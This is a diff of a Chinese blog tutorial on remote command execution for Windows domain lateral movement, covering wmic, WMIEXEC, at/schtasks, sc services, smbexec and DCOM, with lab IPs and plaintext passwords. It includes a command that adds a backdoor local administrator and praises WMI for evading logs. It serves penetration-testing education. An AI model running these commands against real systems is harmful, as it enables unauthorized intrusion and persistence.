@@ -166,11 +166,12 @@
   <div class="content" itemprop="articleBody">
     <h1 id="域渗透远程执行命令的几种姿势"><a href="#域渗透远程执行命令的几种姿势" class="headerlink" title="域渗透远程执行命令的几种姿势"></a>域渗透远程执行命令的几种姿势</h1><h2 id="0x00-vmic"><a href="#0x00-vmic" class="headerlink" title="0x00 vmic"></a>0x00 vmic</h2><p>WMI 的全称是 Windows Management Instrumentation，它出现在所有的 Windows 操作系统中，并由一组强大的工具集合组成，用于管理本地或远程的 Windows 系统，攻击者使用 wmi 来进行攻击，但 Windows 系统默认不会在日志中记录这些操作，可以做到<strong>无日志</strong>，攻击脚本无需写入到磁盘，增加了隐蔽性。推荐使用 wmic 进行远程执行命令。</p>
 <h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol>
-<li>在远程系统上执行 bat 脚本<pre><code>wmic /node:192.168.72.10 /user:administrator /password:L111111! process call create c:\test.bat
-</code></pre></li>
+<li><p>在远程系统上执行 bat 脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.72.10 /user:administrator /password:L111111! process call create c:\test.bat</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>在远程系统上执行单条命令</p>
-<pre><code>wmic /node:192.168.72.10 /user:administrator /password:L111111 process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add
-</code></pre></li>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.72.10 /user:administrator /password:L111111 process call create &quot;cmd.exe /c net user test1 !@#123QWE /add &amp;&amp; net localgroup administrators test1 /add</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
 <h3 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h3><ol>
 <li>需要远程系统启动 Windows Management Instrumentation 服务，开放135端口</li>
@@ -196,94 +197,54 @@
 </ol>
 <h2 id="0x02-WMIEXEC"><a href="#0x02-WMIEXEC" class="headerlink" title="0x02 WMIEXEC"></a>0x02 WMIEXEC</h2><p>WMI 可以远程执行命令，大牛使用VBS脚本调用WMI来模拟 psexec 的功能，于是乎WMIEXEC 就诞生了。基本上psexec 能用的地方，这个脚本也能够使用。整个过程是先调用WMI通过账号密码或者NTLM认证（WCE注入）连接到远程计算机，然后如果提供了账号密码，则用这个账号密码建立一个到目标的IPC连接。随后WMI会建立一个共享文件夹，用于远程读取命令执行结果。 当用户输入命令时，WMI创建进程执行该命令，然后把结果输出到文件，这个文件位于之前创建的共享文件夹中。最后，通过FSO组件访问远程共享文件夹中的结果文件，将结果输出。当结果读取完成时，调用WMI执行命令删除结果文件。最后当WMIEXEC退出时，删除文件共享。<br><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/21.png" alt=""><br>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。</p>
 <p>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p>
-<p><strong>半交互式shell模式</strong></p>
-<pre><code>cscript.exe //nologo wmiexec.vbs /shell IP username password
-</code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/22.png" alt=""></p>
-<p><strong>单个命令执行的模式</strong></p>
-<pre><code>cscript.exe wmiexec.vbs /cmd IP username password &quot;command&quot;
-</code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/23.png" alt=""></p>
-<h2 id="0x03-at-amp-schtasks计划任务"><a href="#0x03-at-amp-schtasks计划任务" class="headerlink" title="0x03 at&amp;schtasks计划任务"></a>0x03 at&amp;schtasks计划任务</h2><h3 id="net-use-at"><a href="#net-use-at" class="headerlink" title="net use + at"></a>net use + at</h3><p>建立ipc连接</p>
-<pre><code>net use \\目标IP\ipc$ password /user:username
-</code></pre><p>拷贝文件到远程系统</p>
-<pre><code>copy 文件 \\目标IP\c$
-</code></pre><p>查看远程主机当前时间</p>
-<pre><code>net use \\目标IP
-</code></pre><p>添加计划任务在远程系统上执行命令</p>
-<pre><code>at \\目标IP 时间 cmd.exe /c &quot;ipconfig /all &gt;c:ip.log&quot;
-</code></pre><p>添加计划任务在远程系统上执行bat脚本</p>
-<pre><code>at \\目标IP 时间 c:test.bat
-</code></pre><p>查看at任务列表</p>
-<pre><code>at \\目标IP
-</code></pre><p>删除at计划任务，运行完成后一定要删除计划任务！</p>
-<pre><code>at \\目标IP 1 /delete
-</code></pre><p>查看所有ipc连接</p>
-<pre><code>net use
-</code></pre><p>删除指定ipc连接</p>
-<pre><code>net use \\目标IP\ipc$ /del
-</code></pre><p>删除所有ipc连接（删除前记得确认是否都是自己测试中建立的连接）</p>
-<pre><code>net use * /del /y
-</code></pre><h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行单条命令)</p>
-<pre><code>schtasks /create /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn test /sc onstart /tr &quot;cmd.exe /c netstat -ano | findstr 3389 &gt;&gt; c:\programdata\error.log&quot; /ru system /f
-</code></pre><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行 bat 脚本)</p>
-<pre><code>schtasks /create /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn test /sc onstart /tr c:\programdata\test.bat /ru system /f 
-</code></pre><p>在远程系统建立计划任务(计划运行时会以管理员权限在远程系统上执行单条命令),注：这条命令不支持 hash 注入后省去用户名密码执行</p>
-<pre><code>schtasks /create /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn test /sc onstart /tr &quot;cmd.exe /c whoami /all &gt;&gt; c:\programdata\error.log&quot; /ru  workgroup\administrator&quot;
-</code></pre><p>查看建立的计划任务是否正确</p>
-<pre><code>schtasks /query /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; | findstr test 
-</code></pre><p>运行建立的计划任务</p>
-<pre><code>schtasks /run /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /i /tn &quot;test&quot;
-</code></pre><p>删除建立的计划任务</p>
-<pre><code>schtasks /delete /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn &quot;test&quot; /f 
-</code></pre><p>注意：<br>工具需要远程系统启动 Task Scheduler 服务，schtasks 不需要 RPC 服务的支持，在条件允许的情况下，尽量使用 schtasks，因为在某些条件下，at 执行完任务后，任务信息没有删除（需要手动删除），用at命令查不到任务信息，但是用 schtasks 却能看到任务信息，任务名是At加一个数字。</p>
-<h2 id="0x04-SC添加服务远程执行命令"><a href="#0x04-SC添加服务远程执行命令" class="headerlink" title="0x04 SC添加服务远程执行命令"></a>0x04 SC添加服务远程执行命令</h2><h3 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传等待运行的 bat 脚本到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行 bat 脚本）</p>
-<pre><code>sc \\192.168.17.138 create test binpath= &quot;cmd.exe /c start c:\programdata\test.bat&quot;
-</code></pre><p>开启服务，运行其它命令可以直接修改 bat 脚本内容</p>
-<pre><code>sc \\192.168.17.138 start test
-</code></pre><p>删除服务</p>
-<pre><code>sc \\192.168.17.138 delete test
-</code></pre><h2 id="0x05-smbexec"><a href="#0x05-smbexec" class="headerlink" title="0x05 smbexec"></a>0x05 smbexec</h2><p>smbexec 是基于 psexec 修改的程序，加入了参数来指定默认共享，可以在目标为开启 admin$ 共享但开了其它共享时使用。</p>
-<h3 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传 execserver.exe 到远程系统上</p>
-<pre><code>copy execserver.exe \\192.168.17.138\c$\windows
-</code></pre><p>在远程系统上执行单条命令(以管理员权限执行命令)</p>
-<pre><code>test.exe 192.168.17.138 Administrator !@#123QWE &quot;whoami /all&quot; c$
-</code></pre><p>在远程系统上执行单条命令</p>
-<pre><code>test.exe 192.168.17.138 test !@#123QWE &quot;whoami /all&quot; c$
-</code></pre><p>在远程系统上执行 bat 脚本(以管理员权限执行命令)</p>
-<pre><code>test.exe 192.168.17.138 Administrator !@#123QWE c:\programdata\test.bat ipc$
-</code></pre><p>删除远程系统上的 execserver.exe</p>
-<pre><code>del \\192.168.17.138\c$\windows\execserver.exe
-</code></pre><h2 id="0x06-利用DCOM在远程系统执行程序"><a href="#0x06-利用DCOM在远程系统执行程序" class="headerlink" title="0x06 利用DCOM在远程系统执行程序"></a>0x06 利用DCOM在远程系统执行程序</h2><h3 id="DCOM使用介绍"><a href="#DCOM使用介绍" class="headerlink" title="DCOM使用介绍"></a>DCOM使用介绍</h3><h4 id="获得DCOM的程序列表"><a href="#获得DCOM的程序列表" class="headerlink" title="获得DCOM的程序列表"></a>获得DCOM的程序列表</h4><p>powershell命令</p>
-<pre><code>Get-CimInstance Win32_DCOMApplication
-</code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/1.png" alt=""></p>
-<p>注意：<br><code>Get-CimInstance</code> 只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令：</p>
-<pre><code>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
-</code></pre><p>当然，直接使用wmic查询也可以，代码如下：</p>
-<pre><code>wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET /all /FORMAT:list
-</code></pre><p>powershell对WMI的调用可使用wmic命令进行替换，详情可参考：</p>
+<p><strong>半交互式shell模式</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell IP username password</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/22.png" alt=""></p>
+<p><strong>单个命令执行的模式</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe wmiexec.vbs /cmd IP username password &quot;command&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/23.png" alt=""></p>
+<h2 id="0x03-at-amp-schtasks计划任务"><a href="#0x03-at-amp-schtasks计划任务" class="headerlink" title="0x03 at&amp;schtasks计划任务"></a>0x03 at&amp;schtasks计划任务</h2><h3 id="net-use-at"><a href="#net-use-at" class="headerlink" title="net use + at"></a>net use + at</h3><p>建立ipc连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP\ipc$ password /user:username</span><br></pre></td></tr></table></figure></p>
+<p>拷贝文件到远程系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 文件 \\目标IP\c$</span><br></pre></td></tr></table></figure></p>
+<p>查看远程主机当前时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP</span><br></pre></td></tr></table></figure></p>
+<p>添加计划任务在远程系统上执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP 时间 cmd.exe /c &quot;ipconfig /all &gt;c:ip.log&quot;</span><br></pre></td></tr></table></figure></p>
+<p>添加计划任务在远程系统上执行bat脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP 时间 c:test.bat</span><br></pre></td></tr></table></figure></p>
+<p>查看at任务列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP</span><br></pre></td></tr></table></figure></p>
+<p>删除at计划任务，运行完成后一定要删除计划任务！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\目标IP 1 /delete</span><br></pre></td></tr></table></figure></p>
+<p>查看所有ipc连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure></p>
+<p>删除指定ipc连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\目标IP\ipc$ /del</span><br></pre></td></tr></table></figure></p>
+<p>删除所有ipc连接（删除前记得确认是否都是自己测试中建立的连接）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use * /del /y</span><br></pre></td></tr></table></figure></p>
+<h3 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h3><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行单条命令)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn test /sc onstart /tr &quot;cmd.exe /c netstat -ano | findstr 3389 &gt;&gt; c:\programdata\error.log&quot; /ru system /f</span><br></pre></td></tr></table></figure></p>
+<p>在远程系统建立计划任务(计划运行时会以 system 权限在远程系统上执行 bat 脚本)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn test /sc onstart /tr c:\programdata\test.bat /ru system /f</span><br></pre></td></tr></table></figure></p>
+<p>在远程系统建立计划任务(计划运行时会以管理员权限在远程系统上执行单条命令),注：这条命令不支持 hash 注入后省去用户名密码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn test /sc onstart /tr &quot;cmd.exe /c whoami /all &gt;&gt; c:\programdata\error.log&quot; /ru  workgroup\administrator&quot;</span><br></pre></td></tr></table></figure></p>
+<p>查看建立的计划任务是否正确<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; | findstr test</span><br></pre></td></tr></table></figure></p>
+<p>运行建立的计划任务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure></p>
+<p>删除建立的计划任务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.17.138 /u workgroup\administrator /p &quot;!@#123QWE&quot; /tn &quot;test&quot; /f</span><br></pre></td></tr></table></figure></p>
+<p>注意：<br>工具需要远程系统启动 Task Scheduler 服务，schtasks 不需要 RPC 服务的支持，在条件允许的情况下，尽量使用 schtasks，因为在某些条件下，at 执行完任务后，任务信息没有删除（需要手动删除），用at命令查不到任务信息，但是用 schtasks 却能看到任务信息，任务名是At加一个数字。</p>
+<h2 id="0x04-SC添加服务远程执行命令"><a href="#0x04-SC添加服务远程执行命令" class="headerlink" title="0x04 SC添加服务远程执行命令"></a>0x04 SC添加服务远程执行命令</h2><h3 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传等待运行的 bat 脚本到目标系统上，创建服务（开启服务时会以system 权限在远程系统上执行 bat 脚本）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.17.138 create test binpath= &quot;cmd.exe /c start c:\programdata\test.bat&quot;</span><br></pre></td></tr></table></figure></p>
+<p>开启服务，运行其它命令可以直接修改 bat 脚本内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.17.138 start test</span><br></pre></td></tr></table></figure></p>
+<p>删除服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.17.138 delete test</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-smbexec"><a href="#0x05-smbexec" class="headerlink" title="0x05 smbexec"></a>0x05 smbexec</h2><p>smbexec 是基于 psexec 修改的程序，加入了参数来指定默认共享，可以在目标为开启 admin$ 共享但开了其它共享时使用。</p>
+<h3 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h3><p>建立 ipc 连接后，上传 execserver.exe 到远程系统上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy execserver.exe \\192.168.17.138\c$\windows</span><br></pre></td></tr></table></figure></p>
+<p>在远程系统上执行单条命令(以管理员权限执行命令)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE &quot;whoami /all&quot; c$</span><br></pre></td></tr></table></figure></p>
+<p>在远程系统上执行单条命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe 192.168.17.138 test !@#123QWE &quot;whoami /all&quot; c$</span><br></pre></td></tr></table></figure></p>
+<p>在远程系统上执行 bat 脚本(以管理员权限执行命令)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe 192.168.17.138 Administrator !@#123QWE c:\programdata\test.bat ipc$</span><br></pre></td></tr></table></figure></p>
+<p>删除远程系统上的 execserver.exe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del \\192.168.17.138\c$\windows\execserver.exe</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06-利用DCOM在远程系统执行程序"><a href="#0x06-利用DCOM在远程系统执行程序" class="headerlink" title="0x06 利用DCOM在远程系统执行程序"></a>0x06 利用DCOM在远程系统执行程序</h2><h3 id="DCOM使用介绍"><a href="#DCOM使用介绍" class="headerlink" title="DCOM使用介绍"></a>DCOM使用介绍</h3><h4 id="获得DCOM的程序列表"><a href="#获得DCOM的程序列表" class="headerlink" title="获得DCOM的程序列表"></a>获得DCOM的程序列表</h4><p>powershell命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/1.png" alt=""></p>
+<p>注意：<br><code>Get-CimInstance</code> 只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure></p>
+<p>当然，直接使用wmic查询也可以，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET /all /FORMAT:list</span><br></pre></td></tr></table></figure></p>
+<p>powershell对WMI的调用可使用wmic命令进行替换，详情可参考：</p>
 <p><a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/</a></p>
-<h4 id="对本机测试"><a href="#对本机测试" class="headerlink" title="对本机测试"></a>对本机测试</h4><p>管理员权限，powershell代码如下:<br>获得”MMC20.Application”支持的操作</p>
-<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))
-$com.Document.ActiveView | Get-Member
-</code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/2.png" alt=""></p>
-<p><strong>查看ExecuteShellCommand对应的参数说明</strong></p>
-<pre><code>$com.Document.ActiveView.ExecuteShellCommand
-</code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/3.png" alt=""></p>
+<h4 id="对本机测试"><a href="#对本机测试" class="headerlink" title="对本机测试"></a>对本机测试</h4><p>管理员权限，powershell代码如下:<br>获得”MMC20.Application”支持的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView | Get-Member</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/2.png" alt=""></p>
+<p><strong>查看ExecuteShellCommand对应的参数说明</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$com.Document.ActiveView.ExecuteShellCommand</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/3.png" alt=""></p>
 <p>ExecuteShellCommand 对应的参数具体含义可参考以下链接：</p>
 <p><a href="https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx</a></p>
-<p>通过ExecuteShellCommand执行程序</p>
-<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))
-$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)
-</code></pre><h4 id="对远程系统测试"><a href="#对远程系统测试" class="headerlink" title="对远程系统测试"></a>对远程系统测试</h4><p><strong>调用MMC20.Application</strong></p>
-<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.72.10&quot;))
-$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)
-</code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/4.png" alt=""></p>
+<p>通过ExecuteShellCommand执行程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure></p>
+<h4 id="对远程系统测试"><a href="#对远程系统测试" class="headerlink" title="对远程系统测试"></a>对远程系统测试</h4><p><strong>调用MMC20.Application</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.72.10&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&quot;/c calc.exe&quot;,&quot;Minimized&quot;)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/4.png" alt=""></p>
 <p>win7查看后台程序列表<br><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/5.png" alt=""></p>
-<p><strong>调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</strong></p>
-<pre><code>$com = [Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.0.2&quot;)
-$obj = [System.Activator]::CreateInstance($com)
-$item = $obj.item()
-$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
-</code></pre><p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/6.png" alt=""></p>
+<p><strong>调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com = [Type]::GetTypeFromCLSID(&apos;9BA05972-F6A8-11CF-A442-00A0C90A8F39&apos;,&quot;192.168.0.2&quot;)</span><br><span class="line">$obj = [System.Activator]::CreateInstance($com)</span><br><span class="line">$item = $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/yu-shen-tou-yuan-cheng-zhi-xing-ming-ling-de-ji-chong-zi-shi/6.png" alt=""></p>
 <p><strong>注意：</strong></p>
 <p>以上两种方式适用于Win7-Win10</p>
 
